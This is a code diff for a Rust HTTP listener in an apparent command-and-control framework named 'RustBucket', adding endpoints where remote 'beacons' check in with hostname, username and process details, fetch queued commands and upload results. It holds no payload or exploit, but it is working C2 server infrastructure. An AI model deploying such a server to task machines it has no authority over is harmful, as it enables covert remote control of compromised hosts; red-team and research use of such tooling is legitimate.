@@ -1,33 +1,54 @@
 use actix_web::{web, App, HttpResponse, HttpServer, Responder};
+use serde::{Deserialize, Serialize};
+use std::collections::HashMap;
 use std::net::SocketAddr;
 use std::sync::{
     atomic::{AtomicBool, Ordering},
-    Arc,
+    Arc, Mutex, RwLock,
 };
+use std::time::{Duration, SystemTime};
 use tokio::sync::oneshot;
 use tokio::task::JoinHandle;
 use uuid::Uuid;
 
 use crate::listener::*;
+use crate::message::*;
+use crate::session::SessionManager;
+
+// Server state
+pub struct ServerState {
+    pub beacons: Arc<Mutex<HashMap<Uuid, BeaconInfo>>>,
+    pub tasks: Arc<Mutex<HashMap<Uuid, Task>>>,
+    pub results: Arc<Mutex<HashMap<Uuid, TaskResult>>>,
+}
 
 pub struct HttpListener {
     name: String,
     id: Uuid,
     addr: SocketAddr,
+    // sessions: Arc<RwLock<HashMap<Uuid, Arc<Session>>>>,
+    session_manager: Arc<RwLock<SessionManager>>,
     running: Arc<AtomicBool>,
     shutdown_tx: Option<oneshot::Sender<()>>,
     handle: Option<JoinHandle<()>>,
+    state: Arc<ServerState>,
 }
 
 impl HttpListener {
-    pub fn new(name: &str, addr: SocketAddr) -> Self {
+    pub fn new(name: &str, addr: SocketAddr, session_manager: Arc<RwLock<SessionManager>>) -> Self {
         HttpListener {
             name: name.to_string(),
             id: Uuid::new_v4(),
             addr,
+            session_manager,
             running: Arc::new(AtomicBool::new(false)),
             shutdown_tx: None,
             handle: None,
+            state: Arc::new(ServerState {
+                beacons: Arc::new(Mutex::new(HashMap::new())),
+                tasks: Arc::new(Mutex::new(HashMap::new())),
+                results: Arc::new(Mutex::new(HashMap::new())),
+            }),
         }
     }
 
@@ -41,6 +62,10 @@ impl HttpListener {
 
     pub fn id(&self) -> Uuid {
         self.id
+    }
+
+    pub fn get_state(&self) -> Arc<ServerState> {
+        self.state.clone()
     }
 
     pub async fn start(&mut self) -> Result<(), String> {
@@ -58,6 +83,8 @@ impl HttpListener {
         let server_addr = self.addr;
         let listener_name = self.name.clone();
         let listener_id = self.id;
+        let server_state = self.state.clone();
+        let session_manager = self.session_manager.clone();
 
         // Spawn Actix Web server in a separate task
         let handle = tokio::spawn(async move {
@@ -65,6 +92,8 @@ impl HttpListener {
             let listener_data = web::Data::new(ListenerData {
                 name: listener_name.clone(),
                 id: listener_id,
+                state: server_state,
+                session_manager: session_manager.clone(),
             });
 
             // Start server in a separate task
@@ -75,33 +104,236 @@ impl HttpListener {
                         .body(format!("RustBucket Listener: {} ({})", data.name, data.id))
                 }
 
-                async fn command_handler(
-                    command: web::Json<serde_json::Value>,
+                // Beacon registration/check-in endpoint
+                async fn beacon_checkin(
+                    checkin: web::Json<BeaconCheckin>,
                     data: web::Data<ListenerData>,
                 ) -> impl Responder {
-                    log::info!("Listener {} received command: {:?}", data.name, command);
+                    let now = SystemTime::now();
+                    let mut beacons = data.state.beacons.lock().unwrap();
+
+                    // Check if this is a new beacon or an existing one
+                    let beacon_id = if let Some(id) = checkin.id {
+                        // Existing beacon - update last_seen
+                        if let Some(beacon) = beacons.get_mut(&id) {
+                            beacon.last_seen = now;
+                            beacon.ip_address = checkin.ip_address.clone();
+                            id
+                        } else {
+                            // ID provided but not found - register as new
+                            let new_id = Uuid::new_v4();
+                            let beacon_info = BeaconInfo {
+                                id: new_id,
+                                hostname: checkin.hostname.clone(),
+                                ip_address: checkin.ip_address.clone(),
+                                os_info: checkin.os_info.clone(),
+                                username: checkin.username.clone(),
+                                process_id: checkin.process_id,
+                                first_seen: now,
+                                last_seen: now,
+                            };
+                            beacons.insert(new_id, beacon_info);
+
+                            // Create a new session
+                            let mgr = data.session_manager.write().unwrap();
+                            mgr.create_session(new_id.to_string(), checkin.ip_address.to_string());
+
+                            new_id
+                        }
+                    } else {
+                        // New beacon - register
+                        let new_id = Uuid::new_v4();
+                        let beacon_info = BeaconInfo {
+                            id: new_id,
+                            hostname: checkin.hostname.clone(),
+                            ip_address: checkin.ip_address.clone(),
+                            os_info: checkin.os_info.clone(),
+                            username: checkin.username.clone(),
+                            process_id: checkin.process_id,
+                            first_seen: now,
+                            last_seen: now,
+                        };
+
+                        beacons.insert(new_id, beacon_info);
+
+                        // Create a new session
+                        let mgr = data.session_manager.write().unwrap();
+                        mgr.create_session(new_id.to_string(), checkin.ip_address.to_string());
+
+                        new_id
+                    };
+
+                    log::info!("Beacon check-in: {}", beacon_id);
+
                     HttpResponse::Ok().json(serde_json::json!({
-                        "status": "received",
-                        "message": "Command processed",
-                        "listener": data.name,
-                        "listener_id": data.id
+                        "status": "success",
+                        "beacon_id": beacon_id,
                     }))
+                }
+
+                // Get tasks for a specific beacon
+                async fn get_tasks(
+                    path: web::Path<String>,
+                    data: web::Data<ListenerData>,
+                ) -> impl Responder {
+                    let beacon_id = match Uuid::parse_str(&path.into_inner()) {
+                        Ok(id) => id,
+                        Err(_) => return HttpResponse::BadRequest().body("Invalid beacon ID"),
+                    };
+
+                    // Update last_seen
+                    {
+                        let mut beacons = data.state.beacons.lock().unwrap();
+                        if let Some(beacon) = beacons.get_mut(&beacon_id) {
+                            beacon.last_seen = SystemTime::now();
+                        } else {
+                            return HttpResponse::NotFound().body("Beacon not found");
+                        }
+                    }
+
+                    // Get pending tasks for this beacon
+                    let tasks = data.state.tasks.lock().unwrap();
+                    let pending_tasks: Vec<Task> = tasks
+                        .values()
+                        .filter(|task| {
+                            task.beacon_id == beacon_id
+                                && matches!(task.status, TaskStatus::Pending)
+                        })
+                        .cloned()
+                        .collect();
+
+                    // Mark tasks as in progress
+                    {
+                        let mut tasks = data.state.tasks.lock().unwrap();
+                        for task in &pending_tasks {
+                            if let Some(t) = tasks.get_mut(&task.id) {
+                                t.status = TaskStatus::InProgress;
+                            }
+                        }
+                    }
+
+                    HttpResponse::Ok().json(pending_tasks)
+                }
+
+                // Upload task results
+                async fn upload_results(
+                    result: web::Json<TaskResult>,
+                    data: web::Data<ListenerData>,
+                ) -> impl Responder {
+                    let task_result = result.into_inner();
+
+                    // Update task status
+                    {
+                        let mut tasks = data.state.tasks.lock().unwrap();
+                        if let Some(task) = tasks.get_mut(&task_result.task_id) {
+                            task.status = task_result.status.clone();
+                        } else {
+                            return HttpResponse::NotFound().body("Task not found");
+                        }
+                    }
+
+                    // Store the result
+                    {
+                        let mut results = data.state.results.lock().unwrap();
+                        results.insert(task_result.task_id, task_result);
+                    }
+
+                    HttpResponse::Ok().json(serde_json::json!({
+                        "status": "success",
+                        "message": "Task result received"
+                    }))
+                }
+
+                // Create a new task for a beacon
+                async fn create_task(
+                    task_data: web::Json<serde_json::Value>,
+                    data: web::Data<ListenerData>,
+                ) -> impl Responder {
+                    // Extract beacon ID and command from request
+                    let beacon_id_str = match task_data.get("beacon_id") {
+                        Some(val) => match val.as_str() {
+                            Some(s) => s,
+                            None => {
+                                return HttpResponse::BadRequest().body("Invalid beacon ID format")
+                            }
+                        },
+                        None => return HttpResponse::BadRequest().body("Missing beacon ID"),
+                    };
+
+                    let beacon_id = match Uuid::parse_str(beacon_id_str) {
+                        Ok(id) => id,
+                        Err(_) => return HttpResponse::BadRequest().body("Invalid beacon ID"),
+                    };
+
+                    let command = match task_data.get("command") {
+                        Some(val) => match val.as_str() {
+                            Some(s) => s.to_string(),
+                            None => {
+                                return HttpResponse::BadRequest().body("Invalid command format")
+                            }
+                        },
+                        None => return HttpResponse::BadRequest().body("Missing command"),
+                    };
+
+                    // Extract args (optional)
+                    let args = match task_data.get("args") {
+                        Some(val) => match val.as_array() {
+                            Some(arr) => arr
+                                .iter()
+                                .filter_map(|v| v.as_str().map(|s| s.to_string()))
+                                .collect(),
+                            None => Vec::new(),
+                        },
+                        None => Vec::new(),
+                    };
+
+                    // Verify beacon exists
+                    {
+                        let beacons = data.state.beacons.lock().unwrap();
+                        if !beacons.contains_key(&beacon_id) {
+                            return HttpResponse::NotFound().body("Beacon not found");
+                        }
+                    }
+
+                    // Create new task
+                    let task_id = Uuid::new_v4();
+                    let task = Task {
+                        id: task_id,
+                        beacon_id,
+                        command,
+                        args,
+                        created_at: SystemTime::now(),
+                        status: TaskStatus::Pending,
+                    };
+
+                    // Store task
+                    {
+                        let mut tasks = data.state.tasks.lock().unwrap();
+                        tasks.insert(task_id, task.clone());
+                    }
+
+                    HttpResponse::Ok().json(task)
+                }
+
+                // List all active beacons
+                async fn list_beacons(data: web::Data<ListenerData>) -> impl Responder {
+                    let beacons = data.state.beacons.lock().unwrap();
+                    let beacon_list: Vec<BeaconInfo> = beacons.values().cloned().collect();
+                    HttpResponse::Ok().json(beacon_list)
                 }
 
                 let server = HttpServer::new(move || {
                     App::new()
                         .app_data(listener_data.clone())
                         .route("/", web::get().to(index))
-                        .route("/command", web::post().to(command_handler))
-                    // Add more routes as needed
+                        .route("/beacon/checkin", web::post().to(beacon_checkin))
+                        .route("/beacon/tasks/{beacon_id}", web::get().to(get_tasks))
+                        .route("/beacon/results", web::post().to(upload_results))
+                        .route("/tasks", web::post().to(create_task))
+                        .route("/beacons", web::get().to(list_beacons))
                 })
                 .bind(server_addr)
                 .expect("Failed to bind server to address");
-
-                // println!(
-                //     "HTTP listener '{}' ({}) started on {}",
-                //     listener_data.name, listener_data.id, server_addr
-                // );
 
                 // Run the server
                 if let Err(e) = server.run().await {
@@ -154,10 +386,61 @@ impl HttpListener {
     pub fn is_running(&self) -> bool {
         self.running.load(Ordering::SeqCst)
     }
+
+    // Helper method to add a task to a beacon
+    pub fn add_beacon_task(
+        &self,
+        beacon_id: Uuid,
+        command: String,
+        args: Vec<String>,
+    ) -> Result<Uuid, String> {
+        let beacons = self.state.beacons.lock().unwrap();
+        if !beacons.contains_key(&beacon_id) {
+            return Err("Beacon not found".to_string());
+        }
+        drop(beacons);
+
+        let task_id = Uuid::new_v4();
+        let task = Task {
+            id: task_id,
+            beacon_id,
+            command,
+            args,
+            created_at: SystemTime::now(),
+            status: TaskStatus::Pending,
+        };
+
+        let mut tasks = self.state.tasks.lock().unwrap();
+        tasks.insert(task_id, task);
+
+        Ok(task_id)
+    }
+
+    // Helper method to clean up stale beacons
+    pub fn cleanup_stale_beacons(&self, timeout: Duration) -> usize {
+        let now = SystemTime::now();
+        let mut beacons = self.state.beacons.lock().unwrap();
+
+        let stale_ids: Vec<Uuid> = beacons
+            .iter()
+            .filter_map(|(id, beacon)| match beacon.last_seen.elapsed() {
+                Ok(elapsed) if elapsed > timeout => Some(*id),
+                _ => None,
+            })
+            .collect();
+
+        for id in &stale_ids {
+            beacons.remove(id);
+        }
+
+        stale_ids.len()
+    }
 }
 
 // Shared data structure for route handlers
 struct ListenerData {
     name: String,
     id: Uuid,
+    state: Arc<ServerState>,
+    session_manager: Arc<RwLock<SessionManager>>, // <-- Add this line
 }
